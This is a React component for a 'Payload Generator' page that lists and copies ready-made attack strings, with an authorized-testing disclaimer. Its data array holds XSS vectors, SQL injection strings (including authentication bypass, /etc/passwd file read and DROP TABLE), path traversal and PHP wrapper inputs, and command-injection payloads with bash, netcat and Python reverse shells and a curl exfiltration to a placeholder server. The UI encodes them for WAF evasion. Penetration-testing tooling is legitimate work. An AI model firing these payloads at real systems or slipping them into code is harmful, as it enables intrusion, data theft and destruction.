import { useState } from "react";
import { motion } from "framer-motion";
import {
  ArrowLeft,
  Copy,
  Check,
  Bug,
  AlertTriangle,
  Shield,
  Code,
  Filter,
} from "lucide-react";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Input } from "@/components/ui/input";

interface Payload {
  name: string;
  category: string;
  payload: string;
  description: string;
  severity: "low" | "medium" | "high" | "critical";
}

const payloads: Payload[] = [
  // XSS
  { name: "Basic Script", category: "XSS", payload: '<script>alert("XSS")</script>', description: "Basic reflected XSS", severity: "medium" },
  { name: "IMG Onerror", category: "XSS", payload: '<img src=x onerror=alert("XSS")>', description: "IMG tag XSS vector", severity: "medium" },
  { name: "SVG Onload", category: "XSS", payload: '<svg onload=alert("XSS")>', description: "SVG element XSS", severity: "medium" },
  { name: "Body Onload", category: "XSS", payload: '<body onload=alert("XSS")>', description: "Body element XSS", severity: "medium" },
  { name: "Input Onfocus", category: "XSS", payload: '<input onfocus=alert("XSS") autofocus>', description: "Autofocus input XSS", severity: "medium" },
  { name: "Details Toggle", category: "XSS", payload: '<details open ontoggle=alert("XSS")>', description: "HTML5 details XSS", severity: "medium" },
  { name: "Event Handler", category: "XSS", payload: '" onmouseover="alert(\'XSS\')"', description: "Attribute injection", severity: "medium" },
  { name: "Template Literal", category: "XSS", payload: '${alert("XSS")}', description: "Template literal injection", severity: "high" },
  { name: "Polyglot", category: "XSS", payload: 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */onerror=alert(\'XSS\'))//', description: "Polyglot bypass", severity: "high" },
  { name: "Encoded HTML", category: "XSS", payload: "&#60;script&#62;alert&#40;1&#41;&#60;/script&#62;", description: "HTML entity encoded", severity: "medium" },
  // SQL Injection
  { name: "Union Select", category: "SQLi", payload: "' UNION SELECT NULL--", description: "Classic UNION injection", severity: "critical" },
  { name: "OR Bypass Auth", category: "SQLi", payload: "' OR '1'='1' --", description: "Authentication bypass", severity: "critical" },
  { name: "AND SLEEP", category: "SQLi", payload: "' AND SLEEP(5)--", description: "Time-based blind", severity: "critical" },
  { name: "BENCHMARK", category: "SQLi", payload: "' AND BENCHMARK(5000000,SHA1('test'))--", description: "MySQL time-based", severity: "critical" },
  { name: "Error Based", category: "SQLi", payload: "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--", description: "MySQL error extraction", severity: "critical" },
  { name: "Stacked Query", category: "SQLi", payload: "'; DROP TABLE users;--", description: "Stacked query (destructive)", severity: "critical" },
  { name: "WaitFor Delay", category: "SQLi", payload: "'; WAITFOR DELAY '0:0:5'--", description: "MSSQL time-based", severity: "critical" },
  { name: "Double Query", category: "SQLi", payload: "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT DATABASE()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--", description: "MySQL double query", severity: "critical" },
  { name: "Load File", category: "SQLi", payload: "' AND 1=1 UNION SELECT LOAD_FILE('/etc/passwd')--", description: "MySQL file read", severity: "critical" },
  { name: "Int Bypass", category: "SQLi", payload: "0 OR 1=1", description: "Integer-based bypass", severity: "high" },
  // LFI/RFI
  { name: "Basic LFI", category: "LFI", payload: "../../../etc/passwd", description: "Basic path traversal", severity: "high" },
  { name: "Null Byte", category: "LFI", payload: "../../../../etc/passwd%00", description: "Null byte injection", severity: "high" },
  { name: "Double Encoding", category: "LFI", payload: "..%252f..%252f..%252fetc/passwd", description: "Double URL encoded", severity: "high" },
  { name: "PHP Filter", category: "LFI", payload: "php://filter/convert.base64-encode/resource=index.php", description: "PHP filter read", severity: "high" },
  { name: "PHP Input", category: "LFI", payload: "php://input", description: "PHP input stream", severity: "critical" },
  { name: "Log Poisoning", category: "LFI", payload: "/var/log/apache2/access.log", description: "Apache log poisoning", severity: "critical" },
  { name: "Windows LFI", category: "LFI", payload: "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", description: "Windows path traversal", severity: "high" },
  // Command Injection
  { name: "Semicolon", category: "CMD", payload: "; whoami", description: "Semicolon separator", severity: "critical" },
  { name: "Pipe", category: "CMD", payload: "| whoami", description: "Pipe injection", severity: "critical" },
  { name: "Backticks", category: "CMD", payload: "`whoami`", description: "Backtick execution", severity: "critical" },
  { name: "Dollar Parens", category: "CMD", payload: "$(whoami)", description: "Command substitution", severity: "critical" },
  { name: "Reverse Shell", category: "CMD", payload: "; bash -i >& /dev/tcp/127.0.0.1/4444 0>&1", description: "Bash reverse shell", severity: "critical" },
  { name: "Netcat", category: "CMD", payload: "; nc -e /bin/sh 127.0.0.1 4444", description: "Netcat reverse shell", severity: "critical" },
  { name: "Python Rev", category: "CMD", payload: '; python3 -c "import socket,subprocess,os;s=socket.socket();s.connect((\'127.0.0.1\',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\'/bin/sh\',\'-i\'])"', description: "Python reverse shell", severity: "critical" },
  { name: "Curl OOB", category: "CMD", payload: "; curl http://YOUR_SERVER:8080/$(whoami)", description: "Out-of-band data exfil", severity: "high" },
];

const categories = [...new Set(payloads.map((p) => p.category))];
const severities = ["low", "medium", "high", "critical"] as const;

const severityColors: Record<string, string> = {
  low: "text-emerald",
  medium: "text-amber",
  high: "text-orange",
  critical: "text-red",
};

interface PayloadGeneratorProps {
  onBack: () => void;
}

export function PayloadGenerator({ onBack }: PayloadGeneratorProps) {
  const [categoryFilter, setCategoryFilter] = useState<string | null>(null);
  const [severityFilter, setSeverityFilter] = useState<string | null>(null);
  const [search, setSearch] = useState("");
  const [copiedIdx, setCopiedIdx] = useState<number | null>(null);
  const [selectedPayload, setSelectedPayload] = useState<Payload | null>(null);
  const [customInput, setCustomInput] = useState("");
  const [encoder, setEncoder] = useState<"none" | "url" | "html" | "base64">("none");

  const filtered = payloads.filter((p) => {
    if (categoryFilter && p.category !== categoryFilter) return false;
    if (severityFilter && p.severity !== severityFilter) return false;
    if (search && !p.name.toLowerCase().includes(search.toLowerCase()) && !p.payload.toLowerCase().includes(search.toLowerCase())) return false;
    return true;
  });

  const encodePayload = (payload: string): string => {
    switch (encoder) {
      case "url":
        return encodeURIComponent(payload);
      case "html":
        return payload.replace(/[<>&"']/g, (c) => {
          const map: Record<string, string> = { "<": "&lt;", ">": "&gt;", "&": "&amp;", '"': "&quot;", "'": "&#39;" };
          return map[c] || c;
        });
      case "base64":
        return btoa(payload);
      default:
        return payload;
    }
  };

  const copyPayload = (payload: string, idx: number) => {
    navigator.clipboard.writeText(encodePayload(payload));
    setCopiedIdx(idx);
    setTimeout(() => setCopiedIdx(null), 2000);
  };

  return (
    <motion.div
      initial={{ opacity: 0, y: 10 }}
      animate={{ opacity: 1, y: 0 }}
      transition={{ duration: 0.3 }}
      className="min-h-full"
    >
      <div className="max-w-6xl mx-auto px-4 sm:px-6 py-8">
        <Button
          variant="ghost"
          size="sm"
          onClick={onBack}
          className="gap-2 mb-6 text-muted-foreground hover:text-foreground"
        >
          <ArrowLeft className="size-4" />
          Back to Dashboard
        </Button>

        <div className="flex flex-col sm:flex-row items-start gap-6 mb-8">
          <div className="flex size-16 items-center justify-center rounded-2xl shrink-0 bg-amber/10">
            <Bug className="size-8 text-amber" />
          </div>
          <div className="flex-1 min-w-0">
            <div className="flex items-center gap-3 mb-2 flex-wrap">
              <h1 className="text-2xl sm:text-3xl font-bold tracking-tight">
                Payload Generator
              </h1>
              <Badge variant="outline" className="text-xs border-emerald/40 text-emerald">
                Active
              </Badge>
            </div>
            <p className="text-muted-foreground text-base">
              Browse and copy pre-built security testing payloads for XSS, SQL injection, LFI, and command injection.
            </p>
          </div>
        </div>

        {/* Warning */}
        <div className="glass-card rounded-xl p-4 border border-red/20 mb-6">
          <div className="flex items-start gap-3">
            <Shield className="size-5 text-red shrink-0 mt-0.5" />
            <div>
              <p className="text-sm font-medium text-red mb-1">
                Authorized Testing Only
              </p>
              <p className="text-xs text-muted-foreground">
                These payloads are exclusively for use in authorized penetration testing engagements,
                CTF competitions, and controlled lab environments. Unauthorized use against systems
                you do not own or have written permission to test is illegal.
              </p>
            </div>
          </div>
        </div>

        {/* Filters */}
        <div className="glass-card rounded-2xl p-6 mb-6">
          <div className="flex items-center gap-2 mb-4">
            <Filter className="size-4 text-muted-foreground" />
            <h3 className="text-sm font-semibold">Filters</h3>
          </div>

          <div className="flex flex-wrap gap-2 mb-3">
            <button
              onClick={() => setCategoryFilter(null)}
              className={`px-3 py-1.5 rounded-lg text-xs font-medium transition-all ${
                categoryFilter === null
                  ? "bg-cyan/10 text-cyan border border-cyan/30"
                  : "bg-muted/30 text-muted-foreground border border-border/50"
              }`}
            >
              All
            </button>
            {categories.map((cat) => (
              <button
                key={cat}
                onClick={() => setCategoryFilter(cat)}
                className={`px-3 py-1.5 rounded-lg text-xs font-medium transition-all ${
                  categoryFilter === cat
                    ? "bg-cyan/10 text-cyan border border-cyan/30"
                    : "bg-muted/30 text-muted-foreground border border-border/50"
                }`}
              >
                {cat}
              </button>
            ))}
          </div>

          <div className="flex flex-wrap items-center gap-3">
            <div className="flex-1 min-w-[200px]">
              <Input
                placeholder="Search payloads..."
                value={search}
                onChange={(e) => setSearch(e.target.value)}
                className="text-sm"
              />
            </div>

            <div className="flex items-center gap-2">
              <span className="text-[10px] text-muted-foreground uppercase tracking-wider">
                Encode:
              </span>
              {(["none", "url", "html", "base64"] as const).map((enc) => (
                <button
                  key={enc}
                  onClick={() => setEncoder(enc)}
                  className={`px-2 py-1 rounded text-[11px] font-medium transition-all ${
                    encoder === enc
                      ? "bg-purple/10 text-purple border border-purple/30"
                      : "bg-muted/30 text-muted-foreground border border-border/50"
                  }`}
                >
                  {enc === "none" ? "Raw" : enc.toUpperCase()}
                </button>
              ))}
            </div>
          </div>
        </div>

        {/* Payloads Table */}
        <div className="glass-card rounded-2xl overflow-hidden mb-6">
          <div className="px-5 py-3 border-b border-border/50 flex items-center justify-between">
            <h3 className="text-sm font-semibold">
              Payloads ({filtered.length})
            </h3>
          </div>
          <div className="overflow-x-auto">
            <table className="w-full text-sm">
              <thead>
                <tr className="border-b border-border/50">
                  <th className="text-left px-5 py-2.5 text-xs font-medium text-muted-foreground uppercase">
                    Name
                  </th>
                  <th className="text-left px-5 py-2.5 text-xs font-medium text-muted-foreground uppercase">
                    Category
                  </th>
                  <th className="text-left px-5 py-2.5 text-xs font-medium text-muted-foreground uppercase">
                    Severity
                  </th>
                  <th className="text-left px-5 py-2.5 text-xs font-medium text-muted-foreground uppercase hidden lg:table-cell">
                    Payload
                  </th>
                  <th className="text-left px-5 py-2.5 text-xs font-medium text-muted-foreground uppercase">
                    Action
                  </th>
                </tr>
              </thead>
              <tbody>
                {filtered.map((p, i) => (
                  <tr
                    key={`${p.name}-${i}`}
                    className="border-b border-border/30 last:border-0 hover:bg-muted/30 transition-colors cursor-pointer"
                    onClick={() => setSelectedPayload(selectedPayload === p ? null : p)}
                  >
                    <td className="px-5 py-2.5">
                      <div className="flex items-center gap-2">
                        <Code className="size-3.5 text-muted-foreground shrink-0" />
                        <span className="font-medium text-xs">{p.name}</span>
                      </div>
                    </td>
                    <td className="px-5 py-2.5">
                      <Badge variant="outline" className="text-[10px]">
                        {p.category}
                      </Badge>
                    </td>
                    <td className="px-5 py-2.5">
                      <span className={`text-xs font-medium capitalize ${severityColors[p.severity]}`}>
                        {p.severity}
                      </span>
                    </td>
                    <td className="px-5 py-2.5 hidden lg:table-cell">
                      <code className="text-[10px] text-muted-foreground bg-muted/50 rounded px-1.5 py-0.5 break-all font-mono">
                        {p.payload.length > 80 ? p.payload.slice(0, 80) + "..." : p.payload}
                      </code>
                    </td>
                    <td className="px-5 py-2.5">
                      <button
                        onClick={(e) => {
                          e.stopPropagation();
                          copyPayload(p.payload, i);
                        }}
                        className="text-muted-foreground hover:text-cyan transition-colors"
                      >
                        {copiedIdx === i ? (
                          <Check className="size-3.5 text-emerald" />
                        ) : (
                          <Copy className="size-3.5" />
                        )}
                      </button>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </div>

        {/* Selected Payload Detail */}
        {selectedPayload && (
          <motion.div
            initial={{ opacity: 0, y: 10 }}
            animate={{ opacity: 1, y: 0 }}
            className="glass-card rounded-2xl p-6 mb-6"
          >
            <div className="flex items-center justify-between mb-3">
              <div className="flex items-center gap-2">
                <Bug className="size-4 text-amber" />
                <h3 className="text-sm font-semibold">{selectedPayload.name}</h3>
                <Badge variant="outline" className="text-[10px]">{selectedPayload.category}</Badge>
              </div>
              <button
                onClick={() => setSelectedPayload(null)}
                className="text-xs text-muted-foreground hover:text-foreground"
              >
                Close
              </button>
            </div>
            <p className="text-xs text-muted-foreground mb-3">{selectedPayload.description}</p>
            <div className="bg-[#0d1117] rounded-xl p-4 overflow-x-auto border border-border/30">
              <pre className="text-sm font-mono text-emerald whitespace-pre-wrap break-all">
                {encodePayload(selectedPayload.payload)}
              </pre>
            </div>
            <div className="flex items-center gap-3 mt-3">
              <Button
                onClick={() => copyPayload(selectedPayload.payload, -1)}
                size="sm"
                className="gap-1.5"
              >
                {copiedIdx === -1 ? <Check className="size-3 text-emerald" /> : <Copy className="size-3" />}
                {copiedIdx === -1 ? "Copied" : "Copy Payload"}
              </Button>
            </div>
          </motion.div>
        )}

        {/* Custom Input */}
        <div className="glass-card rounded-2xl p-6 mb-6">
          <h3 className="text-sm font-semibold mb-3">Custom Input Encoder</h3>
          <Input
            value={customInput}
            onChange={(e) => setCustomInput(e.target.value)}
            placeholder="Enter a custom string to encode..."
            className="font-mono text-sm mb-3"
          />
          {customInput && (
            <div className="bg-[#0d1117] rounded-xl p-4 overflow-x-auto border border-border/30">
              <pre className="text-sm font-mono text-amber whitespace-pre-wrap break-all">
                {encodePayload(customInput)}
              </pre>
            </div>
          )}
        </div>

        <div className="glass-card rounded-xl p-4 border border-amber/20">
          <div className="flex items-start gap-3">
            <AlertTriangle className="size-4 text-amber shrink-0 mt-0.5" />
            <p className="text-xs text-muted-foreground">
              <strong className="text-foreground">Note:</strong> All payloads are provided as-is for
              educational and authorized testing purposes. The encoder applies basic transformations
              — real-world WAF bypass may require additional encoding layers and context-specific
              obfuscation.
            </p>
          </div>
        </div>
      </div>
    </motion.div>
  );
}
